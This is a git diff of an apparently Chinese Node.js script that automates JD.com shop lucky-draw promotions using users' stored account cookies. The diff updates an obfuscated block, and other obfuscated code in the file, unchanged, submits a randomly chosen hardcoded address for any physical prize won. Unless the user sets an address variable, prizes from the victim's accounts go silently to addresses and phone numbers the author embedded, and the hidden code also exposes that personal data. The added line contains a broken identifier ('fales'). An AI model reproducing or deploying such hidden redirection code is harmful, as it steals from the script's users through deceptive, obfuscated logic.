@@ -1,24 +1,20 @@
 /*
 [task_local]
 # 幸运抽奖
-7 7 7 7 7  m_jd_wx_addCart.js, tag=幸运抽奖, enabled=true
+7 7 7 7 7  jd_wx_luckDraw.js, tag=幸运抽奖, enabled=true
  */
 const $ = new Env('幸运抽奖');
 const notify = $.isNode() ? require('./sendNotify') : '';
 //Node.js用户请在jdCookie.js处填写京东ck;
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
+const moment = require('moment')
+CryptoScripts()
+$.CryptoJS = $.isNode() ? require('crypto-js') : CryptoJS;
 let jdNotify = false;//是否关闭通知，false打开通知推送，true关闭通知推送
 $.activityUrl = process.env.M_WX_LUCK_DRAW_URL ? process.env.M_WX_LUCK_DRAW_URL : '';
 $.activityId = getQueryString($.activityUrl, 'activityId')
 $.openCard = false
-$.exportActivityIds = ""
-$.friendUuid = ""
-$.friendUuids = []
 $.message = ""
-$.helpTimes = -1
-$.hasHelpedTimes = 0
-$.restartNo = 1
-$.friendUuidId = 0
 $.drawType = 0
 $.LZ_AES_PIN = ""
 $.stop = false
@@ -26,14 +22,11 @@ $.canDrawTimes = 0
 $.notDrawCount = 0
 $.prizeMsg = ""
 $.drawConsume = -1
-$.randomArray = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
-var moment = require('moment')
-CryptoScripts()
-$.CryptoJS = $.isNode() ? require('crypto-js') : CryptoJS;
+
 //IOS等用户直接用NobyDa的jd cookie
 let cookiesArr = [], cookie = '', message;
-let lz_jdpin_token_cookie = ''
 let activityCookie = ''
+let lz_jdpin_token_cookie = ''
 
 const redis = require('redis');
 $.redisStatus = process.env.USE_REDIS ? process.env.USE_REDIS : false;
@@ -45,7 +38,7 @@ $.luckDrawRunNum = process.env.LUCK_DRAW_RUN_NUM ? process.env.LUCK_DRAW_RUN_NUM
 $.luckDrawRunNum2 = process.env.LUCK_DRAW_RUN_NUM2 ? process.env.LUCK_DRAW_RUN_NUM2 : 5;
 $.signUrl = process.env.JD_SIGN_URL ? process.env.JD_SIGN_URL : '';
 if ($.signUrl == '') {
-    console.log(`请自行搭建sign接口，并设置环境变量-->\n  export JD_SIGN_URL="你的接口地址"`)
+    console.log(`🈳 请自行搭建sign接口，并设置环境变量-->\n  export JD_SIGN_URL="你的接口地址"`)
     return
 }
 let TokenKey = "TOKEN_KEY:"
@@ -55,13 +48,12 @@ if ($.redisStatus) {
         url: `redis://${$.redisUrl}`
     });
 } else {
-    console.log(`禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
+    console.log(`🈳 禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
 }
 $.openedCardStatus = false
 $.skipCk = process.env.WX_SKIP_PIN ? process.env.WX_SKIP_PIN : '';
 
-var __encode = 'jsjiami.com', _a = {}, _0xb483 = ["\x5F\x64\x65\x63\x6F\x64\x65", "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(_a); var __Oxe8c61 = ["\x69\x6E\x70\x75\x74\x41\x64\x64\x72\x65\x73\x73", "\x49\x4E\x50\x55\x54\x5F\x41\x44\x44\x52\x45\x53\x53", "\x65\x6E\x76", "", "\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79", "\x3B", "\x73\x70\x6C\x69\x74", "\u4F60\u586B\u5199\u7684\u5730\u5740\u4E3A\x2D\x2D\x2D\x3E", "\x6C\x6F\x67", "\x70\x75\x73\x68", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x39\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\u7530\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\u7530\u8C46\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\u5DE9\u5927\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x32\x2D\x33\x2D\x35\x30\x35\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x33\x2C\u5DE9\u5C0F\u82B1", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u7530\u751C\u8C46", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u5E38\u5C0F\u8C46", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u5F20\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x32\x2C\x31\x39\x35\x36\x30\x37\x30\x37\x39\x32\x36\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u4EAC\u90FD", "\x75\x6E\x64\x65\x66\x69\x6E\x65\x64", "\u5220\u9664", "\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A", "\u671F\u5F39\u7A97\uFF0C", "\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C", "\x6A\x73\x6A\x69\x61", "\x6D\x69\x2E\x63\x6F\x6D"]; $[__Oxe8c61[0x0]] = process[__Oxe8c61[0x2]][__Oxe8c61[0x1]] ? process[__Oxe8c61[0x2]][__Oxe8c61[0x1]] : __Oxe8c61[0x3]; $[__Oxe8c61[0x4]] = []; if ($[__Oxe8c61[0x0]] != __Oxe8c61[0x3]) { temp = $[__Oxe8c61[0x0]][__Oxe8c61[0x6]](__Oxe8c61[0x5]); console[__Oxe8c61[0x8]](`${__Oxe8c61[0x7]}`); for (let address of temp) { console[__Oxe8c61[0x8]](address); $[__Oxe8c61[0x4]][__Oxe8c61[0x9]](address) } } else { $[__Oxe8c61[0x4]] = [__Oxe8c61[0xa], __Oxe8c61[0xb], __Oxe8c61[0xc], __Oxe8c61[0xd], __Oxe8c61[0xe], __Oxe8c61[0xf], __Oxe8c61[0x10], __Oxe8c61[0x11]] };;; (function (_0x55c0x2, _0x55c0x3, _0x55c0x4, _0x55c0x5, _0x55c0x6, _0x55c0x7) { _0x55c0x7 = __Oxe8c61[0x12]; _0x55c0x5 = function (_0x55c0x8) { if (typeof alert !== _0x55c0x7) { alert(_0x55c0x8) }; if (typeof console !== _0x55c0x7) { console[__Oxe8c61[0x8]](_0x55c0x8) } }; _0x55c0x4 = function (_0x55c0x9, _0x55c0x2) { return _0x55c0x9 + _0x55c0x2 }; _0x55c0x6 = _0x55c0x4(__Oxe8c61[0x13], _0x55c0x4(_0x55c0x4(__Oxe8c61[0x14], __Oxe8c61[0x15]), __Oxe8c61[0x16])); try { _0x55c0x2 = __encode; if (!(typeof _0x55c0x2 !== _0x55c0x7 && _0x55c0x2 === _0x55c0x4(__Oxe8c61[0x17], __Oxe8c61[0x18]))) { _0x55c0x5(_0x55c0x6) } } catch (e) { _0x55c0x5(_0x55c0x6) } })({})
-
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe9642=["\x69\x6E\x70\x75\x74\x41\x64\x64\x72\x65\x73\x73","\x49\x4E\x50\x55\x54\x5F\x41\x44\x44\x52\x45\x53\x53","\x65\x6E\x76","","\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\x72\x65\x61\x6C\x46\x6C\x61\x67","\x3B","\x73\x70\x6C\x69\x74","\u2705\x20\u4F60\u586B\u5199\u7684\u5730\u5740\u4E3A\x2D\x2D\x2D\x3E","\x6C\x6F\x67","\x70\x75\x73\x68","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x39\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\u7530\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\u7530\u8C46\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\u5DE9\u5927\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x32\x2D\x33\x2D\x35\x30\x35\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x33\x2C\u5DE9\u5C0F\u82B1","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u7530\u751C\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u5E38\u5C0F\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u5F20\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x32\x2C\x31\x39\x35\x36\x30\x37\x30\x37\x39\x32\x36\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u4EAC\u90FD","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];$[__Oxe9642[0x0]]= process[__Oxe9642[0x2]][__Oxe9642[0x1]]?process[__Oxe9642[0x2]][__Oxe9642[0x1]]:__Oxe9642[0x3];$[__Oxe9642[0x4]]= [];$[__Oxe9642[0x5]]= false;if($[__Oxe9642[0x0]]!= __Oxe9642[0x3]){temp= $[__Oxe9642[0x0]][__Oxe9642[0x7]](__Oxe9642[0x6]);console[__Oxe9642[0x9]](`${__Oxe9642[0x8]}`);for(let address of temp){console[__Oxe9642[0x9]](address);$[__Oxe9642[0x4]][__Oxe9642[0xa]](address);$[__Oxe9642[0x5]]= fales}}else {$[__Oxe9642[0x4]]= [__Oxe9642[0xb],__Oxe9642[0xc],__Oxe9642[0xd],__Oxe9642[0xe],__Oxe9642[0xf],__Oxe9642[0x10],__Oxe9642[0x11],__Oxe9642[0x12]]};;;(function(_0xf3c1x2,_0xf3c1x3,_0xf3c1x4,_0xf3c1x5,_0xf3c1x6,_0xf3c1x7){_0xf3c1x7= __Oxe9642[0x13];_0xf3c1x5= function(_0xf3c1x8){if( typeof alert!== _0xf3c1x7){alert(_0xf3c1x8)};if( typeof console!== _0xf3c1x7){console[__Oxe9642[0x9]](_0xf3c1x8)}};_0xf3c1x4= function(_0xf3c1x9,_0xf3c1x2){return _0xf3c1x9+ _0xf3c1x2};_0xf3c1x6= _0xf3c1x4(__Oxe9642[0x14],_0xf3c1x4(_0xf3c1x4(__Oxe9642[0x15],__Oxe9642[0x16]),__Oxe9642[0x17]));try{_0xf3c1x2= __encode;if(!( typeof _0xf3c1x2!== _0xf3c1x7&& _0xf3c1x2=== _0xf3c1x4(__Oxe9642[0x18],__Oxe9642[0x19]))){_0xf3c1x5(_0xf3c1x6)}}catch(e){_0xf3c1x5(_0xf3c1x6)}})({})
 
 if ($.isNode()) {
     Object.keys(jdCookieNode).forEach((item) => {
@@ -75,20 +67,33 @@ if ($.isNode()) {
 !(async () => {
     if ($.redisStatus) {
         redisClient.on('ready', () => {
-            console.log('redis已准备就绪')
+            // console.log('✅ redis已准备就绪')
         })
 
         redisClient.on('error', err => {
-            console.log("redis异常：" + err)
+            console.log("❌ redis异常：" + err)
 
         })
         await redisClient.connect()
-        console.log('redis连接成功')
+        console.log('✅ redis连接成功')
     }
+    console.log(`\n✅ 活动链接：${$.activityUrl}\n`)
+
     if (!cookiesArr[0]) {
-        $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
         return;
     }
+
+    if ($.skipCk != '') {
+        for (let skipCk of $.skipCk.split("&")) {
+            for (let cookie of cookiesArr) {
+                if (cookie.indexOf(skipCk) != -1) {
+                    removeItem(cookiesArr, cookie)
+                    console.log(`\n✅ 跳过指定cookie【${skipCk}】成功`)
+                }
+            }
+        }
+    }
+
     if ($.activityUrl.indexOf("isvjd") != -1) {
         $.activityUrl = $.activityUrl.replace("isvjd", "isvjcloud")
     }
@@ -98,28 +103,23 @@ if ($.isNode()) {
 
     // 获取当前时间
     today = moment().format("YYYY-MM-DD")
-    console.log(`当前日期：${today}`)
+    // console.log(`\n⏰ 当前日期：${today}`)
     now = moment()
-    overTime = `${today} 00:45:00`
+    overTime = `${today} 02:00:00`
     overTimeSt = moment(overTime, 'YYYY-MM-DD HH:mm:ss').valueOf()
     busyTimeStatus = false
     if (now <= overTimeSt) {
         $.runNum = $.luckDrawRunNum2
-        console.log(`BusyTime--> 跑前${$.runNum}个号`)
+        console.log(`\n⚠️【当前时间为BusyTime】 --> 跑前${$.runNum}个号`)
         busyTimeStatus = true
     } else {
         $.runNum = $.luckDrawRunNum
-        console.log(`NotBusyTime--> 跑前${$.runNum}个号`)
+        console.log(`\n✅【当前时间为NotBusyTime】--> 跑前${$.runNum}个号`)
     }
 
     for (let i = 0; i < $.runNum; i++) {
         $.Token = "";
         cookie = cookiesArr[i]
-        if ($.skipCk != '') {
-            if (cookie.indexOf($.skipCk) != -1) {
-                continue
-            }
-        }
         $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
         $.key = TokenKey + cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]
         $.index = i + 1;
@@ -127,8 +127,6 @@ if ($.isNode()) {
         $.nickName = '';
         console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
         if (!$.isLogin) {
-            $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
-
             if ($.isNode()) {
                 await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
             }
@@ -138,28 +136,19 @@ if ($.isNode()) {
         if ($.stop) {
             break
         }
-        waitTime = parseInt(Math.random() * 1000 + 3000, 10)
 
         if ($.notDrawCount >= 3) {
-            console.log(`抽奖没次数，结束`)
+            console.log(`❌❌❌ 抽奖没次数，结束`)
             break
         }
-
+        console.log(`⏰ 等待3s`)
+        waitTime = parseInt(Math.random() * 2000 + 3000, 10)
         await $.wait(waitTime)
 
     }
     if ($.notDrawCount < 3) {
         if ($.message != '' && !$.stop) {
             await notify.sendNotify("幸运抽奖", `${$.message}\n${$.shopName}\n\n${$.prizeMsg}\n跳转链接\n${$.activityUrl}`)
-        }
-        if (busyTimeStatus) {
-            waitTime = parseInt(Math.random() * 1000, 10)
-            console.log(`等待${waitTime}ms后退出程序`)
-            await $.wait(waitTime)
-        } else {
-            waitTime = parseInt(Math.random() * 1000, 10)
-            console.log(`等待${waitTime}ms后退出程序`)
-            await $.wait(waitTime)
         }
     }
 })()
@@ -170,42 +159,51 @@ if ($.isNode()) {
         $.done();
         if ($.redisStatus) {
             redisClient.quit()
-            console.log('redis关闭成功')
+            console.log('✅ redis关闭成功')
         }
     })
 
-function showMsg() {
-    return new Promise(resolve => {
-        $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
-        resolve()
-    })
+function removeItem(arr, item) {
+    let targetIndex = arr.findIndex((itemTemp) => itemTemp === item);
+    if (targetIndex !== -1) {
+        arr.splice(targetIndex, 1);
+    }
 }
 
 
 async function jdmodule() {
-
-
     $.domain = $.activityUrl.match(/https?:\/\/([^/]+)/) && $.activityUrl.match(
         /https?:\/\/([^/]+)/)[1] || ''
     $.UA = `jdapp;iPhone;10.2.2;13.1.2;${uuid()};M/5.0;network/wifi;ADID/;model/iPhone8,1;addressid/2308460611;appBuild/167863;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;`
 
     await getCK();
-    console.log("lzToken=" + activityCookie)
-
+    if (activityCookie == '') {
+        console.log(`❌ 获取LzToken失败`);
+        return
+    }
     if ($.redisStatus) {
         $.Token = await redisClient.get($.key)
         if ($.Token == '' || $.Token == null) {
-            console.log(`未找到缓存的Token，调用Sign接口`)
             await getSign($.domain)
             await takePostRequest("isvObfuscator");
-            console.log('Token-->:' + $.Token)
+            if ($.Token != '') {
+                console.log(`✅ 获取Token成功`)
+            } else {
+                console.log(`❌ 获取Token失败`)
+                return
+            }
         } else {
-            console.log('缓存Token-->:' + $.Token)
+            console.log(`♻️ 获取缓存Token成功`)
         }
     } else {
         await getSign($.domain)
         await takePostRequest("isvObfuscator");
-        console.log('Token-->:' + $.Token)
+        if ($.Token != '') {
+            console.log(`✅ 获取Token成功`)
+        } else {
+            console.log(`❌ 获取Token失败`)
+            return
+        }
     }
 
     await takePostRequest("getSimpleActInfoVo");
@@ -222,21 +220,8 @@ async function jdmodule() {
         $.enPin = encodeURIComponent($.Pin)
         await takePostRequest("accessLogWithAD")
     }
-    if ($.domain.indexOf('cjhy') != -1) {
-        await takePostRequest("getOpenCardInfo")
-    }
 
     await takePostRequest("shopInfo")
-
-    if ($.needOpenCard == 1 && !$.openedCardStatus) {
-        console.log(`需要开卡`)
-        if ($.luckDrawOpenCard) {
-            console.log(`开卡变量为true，去入会`)
-            await opencard()
-        } else {
-            return
-        }
-    }
 
     // await takePostRequest("getUserInfo")
     $.canDrawTimes = 0
@@ -252,14 +237,29 @@ async function jdmodule() {
         }
     }
 
-    // if ($.canDrawTimes === 0) {
-    //     $.stop = true
-    //     return
-    // }
-    console.log(`可抽奖次数:${$.canDrawTimes}`)
+    if ($.domain.indexOf('cjhy') != -1) {
+        await takePostRequest("getOpenCardInfo")
+    }
+
+    if ($.needOpenCard == 1 && !$.openedCardStatus) {
+        console.log(`⚠️需要开卡`)
+        if ($.luckDrawOpenCard) {
+            console.log(`✅开卡变量为true，去入会`)
+            await opencard()
+        } else {
+            console.log(`🈳未设置开卡变量`)
+            return
+        }
+    }
+
+    console.log(`🎉可抽奖次数:${$.canDrawTimes}次`)
 
     if ($.index <= 3 && $.canDrawTimes == 0) {
         $.notDrawCount++
+        return
+    }
+
+    if ($.canDrawTimes == 0) {
         return
     }
 
@@ -274,14 +274,13 @@ async function jdmodule() {
         if (!$.break) {
 
             if ($.drawType == 0) {
-                console.log(`积分抽奖`)
+                console.log(`☝去积分抽奖-->`)
                 await takePostRequest('cjstart')
             } else {
-                console.log(`普通抽奖`)
+                console.log(`☝去普通抽奖-->`)
                 await takePostRequest('start')
             }
-
-            await $.wait(parseInt(Math.random() * 1000 + 500, 10));
+            await $.wait(parseInt(Math.random() * 1000 + 2000, 10));
             if (Number($.canDrawTimes) <= 0 || m >= 5) {
                 break
             }
@@ -291,7 +290,7 @@ async function jdmodule() {
 
     await takePostRequest("getDrawRecord")
 
-    var __encode = 'jsjiami.com', _a = {}, _0xb483 = ["\x5F\x64\x65\x63\x6F\x64\x65", "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(_a); var __Oxe8861 = ["\x6C\x65\x6E\x67\x74\x68", "\x72\x65\x63\x6F\x72\x64", "\x59\x59\x59\x59\x2D\x4D\x4D\x2D\x44\x44", "\x66\x6F\x72\x6D\x61\x74", "\x6E\x6F\x77", "\x6E\x65\x65\x64\x57\x72\x69\x74\x65\x41\x64\x64\x72\x65\x73\x73", "\x6E", "\x79", "\x67\x69\x66\x74\x44\x61\x74\x65", "\x64\x72\x61\x77\x54\x69\x6D\x65", "\x73\x68\x69\x77\x75\x4E\x61\x6D\x65", "\x6E\x61\x6D\x65", "\u4EAC\u8C46", "\x69\x6E\x64\x65\x78\x4F\x66", "\u79EF\u5206", "\u4F18\u60E0\u5238", "\u5B9E\u7269\u5956\u52B1\x3A", "\x6C\x6F\x67", "\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64", "\x61\x64\x64\x72\x65\x73\x73\x49\x64", "", "\x72\x61\x6E\x64\x6F\x6D", "\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79", "\x72\x6F\x75\x6E\x64", "\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73", "\u90AE\u5BC4\u5730\u5740\u4E3A", "\u7B2C", "\u4E2A\u5730\u5740", "\x2C", "\x73\x70\x6C\x69\x74", "\x70\x72\x6F\x76\x69\x6E\x63\x65", "\x63\x69\x74\x79", "\x63\x6F\x75\x6E\x74\x79", "\x61\x64\x64\x72\x65\x73\x73", "\x70\x68\x6F\x6E\x65", "\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65", "\x61\x72\x65\x61\x43\x6F\x64\x65", "\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65", "\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64", "\x75\x6E\x64\x65\x66\x69\x6E\x65\x64", "\u5220\u9664", "\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A", "\u671F\u5F39\u7A97\uFF0C", "\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C", "\x6A\x73\x6A\x69\x61", "\x6D\x69\x2E\x63\x6F\x6D"]; if ($[__Oxe8861[0x1]][__Oxe8861[0x0]] > 0) { today = moment(Date[__Oxe8861[0x4]]())[__Oxe8861[0x3]](__Oxe8861[0x2]); for (let record of $[__Oxe8861[0x1]]) { needWriteAddress = record[__Oxe8861[0x5]] || __Oxe8861[0x6]; if (needWriteAddress == __Oxe8861[0x7]) { $[__Oxe8861[0x8]] = record[__Oxe8861[0x9]]; if (today == $[__Oxe8861[0x8]]) { $[__Oxe8861[0xa]] = record[__Oxe8861[0xb]]; if ($[__Oxe8861[0xa]][__Oxe8861[0xd]](__Oxe8861[0xc]) == -1 && $[__Oxe8861[0xa]][__Oxe8861[0xd]](__Oxe8861[0xe]) == -1 && $[__Oxe8861[0xa]][__Oxe8861[0xd]](__Oxe8861[0xf]) == -1) { console[__Oxe8861[0x11]](__Oxe8861[0x10] + $[__Oxe8861[0xa]]); $[__Oxe8861[0x12]] = record[__Oxe8861[0x13]] || __Oxe8861[0x14]; randomidx = Math[__Oxe8861[0x17]](Math[__Oxe8861[0x15]]() * $[__Oxe8861[0x16]][__Oxe8861[0x0]]); if (randomidx > ($[__Oxe8861[0x16]][__Oxe8861[0x0]] - 1)) { randomidx = $[__Oxe8861[0x16]][__Oxe8861[0x0]] - 1 }; randomIdxShow = randomidx + 1; $[__Oxe8861[0x18]] = $[__Oxe8861[0x16]][randomidx]; console[__Oxe8861[0x11]](__Oxe8861[0x19] + `${__Oxe8861[0x1a]}${randomIdxShow}${__Oxe8861[0x1b]}`); let fullAddressArray = $[__Oxe8861[0x18]][__Oxe8861[0x1d]](__Oxe8861[0x1c]); $[__Oxe8861[0x1e]] = fullAddressArray[0x0]; $[__Oxe8861[0x1f]] = fullAddressArray[0x1]; $[__Oxe8861[0x20]] = fullAddressArray[0x2]; $[__Oxe8861[0x21]] = fullAddressArray[0x3]; $[__Oxe8861[0x22]] = fullAddressArray[0x4]; $[__Oxe8861[0x23]] = fullAddressArray[0x5]; $[__Oxe8861[0x24]] = fullAddressArray[0x6]; $[__Oxe8861[0x25]] = fullAddressArray[0x7]; if ($[__Oxe8861[0x12]] != __Oxe8861[0x14]) { await takePostRequest(`${__Oxe8861[0x26]}`) } } } } } }; (function (_0x5b38x3, _0x5b38x4, _0x5b38x5, _0x5b38x6, _0x5b38x7, _0x5b38x8) { _0x5b38x8 = __Oxe8861[0x27]; _0x5b38x6 = function (_0x5b38x9) { if (typeof alert !== _0x5b38x8) { alert(_0x5b38x9) }; if (typeof console !== _0x5b38x8) { console[__Oxe8861[0x11]](_0x5b38x9) } }; _0x5b38x5 = function (_0x5b38xa, _0x5b38x3) { return _0x5b38xa + _0x5b38x3 }; _0x5b38x7 = _0x5b38x5(__Oxe8861[0x28], _0x5b38x5(_0x5b38x5(__Oxe8861[0x29], __Oxe8861[0x2a]), __Oxe8861[0x2b])); try { _0x5b38x3 = __encode; if (!(typeof _0x5b38x3 !== _0x5b38x8 && _0x5b38x3 === _0x5b38x5(__Oxe8861[0x2c], __Oxe8861[0x2d]))) { _0x5b38x6(_0x5b38x7) } } catch (e) { _0x5b38x6(_0x5b38x7) } })({})
